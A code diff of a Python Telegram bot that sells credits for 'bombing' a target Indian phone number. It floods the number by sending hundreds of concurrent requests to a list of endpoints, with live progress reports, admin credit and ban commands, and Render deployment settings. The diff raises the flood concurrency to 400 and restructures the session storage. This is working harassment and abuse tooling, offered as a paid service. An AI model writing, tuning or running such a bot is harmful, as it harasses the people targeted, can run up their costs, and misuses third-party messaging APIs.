@@ -26,10 +26,11 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
+# AAPKI TELEGRAM ID
 ADMIN_ID = 8959878185  
 
-# SAFE SPEED FOR RENDER (Crash nahi hoga)
-CONCURRENCY     = 300              
+# SPEED CONFIG (Render Safe)
+CONCURRENCY     = 400              
 DELAY           = 0.0              
 REQUEST_TIMEOUT = 3                
 # ============================================
@@ -38,35 +39,40 @@ logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger("tsunami")
 
 DB_FILE = "users.json"
-user_sessions: dict = {}
+
+# DATABASE: Sirf Users ka data (Credits/Ban)
+users_db: dict = {}
+# SESSIONS: Sirf Bombing ka data (Target/Running)
+active_bombing: dict = {} 
+
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
 
-# ================== DATABASE (JSON) ==================
+# ================== DATABASE ==================
 def load_db():
+    global users_db
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, "r") as f:
-                return json.load(f)
+                users_db = json.load(f)
         except Exception:
-            pass
-    return {}
+            users_db = {}
 
 def save_db():
     try:
         with open(DB_FILE, "w") as f:
-            json.dump(user_sessions, f, indent=4)
+            json.dump(users_db, f, indent=4)
     except Exception as e:
         logger.error(f"DB Save Error: {e}")
 
 def get_user(uid):
     uid_str = str(uid)
-    if uid_str not in user_sessions:
-        user_sessions[uid_str] = {"credits": 0, "banned": False}
+    if uid_str not in users_db:
+        users_db[uid_str] = {"credits": 0, "banned": False}
         save_db()
-    return user_sessions[uid_str]
+    return users_db[uid_str]
 
-user_sessions = load_db()
+load_db()
 
 # ================== HTTP SESSION ==================
 async def get_http_session() -> aiohttp.ClientSession:
@@ -259,11 +265,14 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if user["credits"] < 1:
             return await query.message.edit_text("❌ **Insufficient Credits!**\nAapke paas credits nahi hain. Admin se contact karein.")
         
-        user_sessions[str(uid)]["state"] = "awaiting_target"
+        # Naya session banayein agar nahi hai
+        if str(uid) not in active_bombing:
+            active_bombing[str(uid)] = {}
+        active_bombing[str(uid)]["state"] = "awaiting_target"
         await query.message.edit_text("📱 Send target number (10 digits, no +91):")
 
     elif query.data == "stop_bomb":
-        s = user_sessions.get(str(uid))
+        s = active_bombing.get(str(uid))
         if s and s.get("running"):
             s["running"] = False
             s["cancelled"] = True
@@ -271,7 +280,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             
     elif query.data.startswith("credits_"):
         mins = int(query.data.split("_")[1])
-        s = user_sessions.get(str(uid))
+        s = active_bombing.get(str(uid))
         
         if user["credits"] < mins:
             return await query.answer("❌ Not enough credits!", show_alert=True)
@@ -301,7 +310,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
-    s = user_sessions.get(str(uid))
+    s = active_bombing.get(str(uid))
 
     if not s or s.get("state") != "awaiting_target":
         return
@@ -330,7 +339,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# ================== BOMBING LOGIC (WITH LIVE UPDATES) ==================
+# ================== BOMBING LOGIC ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     mins_to_use = s.get("credits_to_use", 1)
@@ -352,7 +361,7 @@ async def run_bombing(uid: int, s: dict):
                 s["time_up"] = True
                 break
                 
-            s["round"] += 1
+            s["round"] = s.get("round", 0) + 1
             batch = []
             for _ in range(CONCURRENCY):
                 batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
@@ -362,9 +371,9 @@ async def run_bombing(uid: int, s: dict):
             sent += ok
             s["sent"] = sent
 
-            # Live Progress every 10 seconds
+            # Live Progress every 15 seconds
             now = time.time()
-            if now - last_report >= 10:
+            if now - last_report >= 15:
                 last_report = now
                 try:
                     elapsed = int(now - start)
@@ -384,7 +393,7 @@ async def run_bombing(uid: int, s: dict):
             if DELAY > 0:
                 await asyncio.sleep(DELAY)
             else:
-                await asyncio.sleep(0)
+                await asyncio.sleep(0.01) # Thoda sa break taaki server freeze na ho
 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
@@ -462,24 +471,6 @@ async def unban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text("❌ Usage: `/unban <user_id>`")
 
-async def admin_help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    text = (
-        "👑 **Admin Commands:**\n\n"
-        "`/add <id> <amount>` - Add credits\n"
-        "`/remove <id> <amount>` - Remove credits\n"
-        "`/ban <id>` - Ban a user\n"
-        "`/unban <id>` - Unban a user\n"
-        "`/stats` - View bot stats\n"
-    )
-    await update.message.reply_text(text, parse_mode="Markdown")
-
-async def stats_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    total_users = len(user_sessions)
-    total_credits = sum(u.get("credits", 0) for u in user_sessions.values() if isinstance(u, dict))
-    await update.message.reply_text(f"📊 **Bot Stats**\n\n👥 Users: `{total_users}`\n💳 Total Credits in System: `{total_credits}`\n📡 APIs Active: `{len(ENDPOINTS)}`", parse_mode="Markdown")
-
 
 # ================== STARTUP & WEBHOOK ==================
 async def health(request): return PlainTextResponse("OK", status_code=200)
@@ -496,12 +487,10 @@ async def startup():
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
     
     telegram_app.add_handler(CommandHandler("start", start_cmd))
-    telegram_app.add_handler(CommandHandler("help", admin_help_cmd))
     telegram_app.add_handler(CommandHandler("add", add_credit_cmd))
     telegram_app.add_handler(CommandHandler("remove", remove_credit_cmd))
     telegram_app.add_handler(CommandHandler("ban", ban_cmd))
     telegram_app.add_handler(CommandHandler("unban", unban_cmd))
-    telegram_app.add_handler(CommandHandler("stats", stats_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
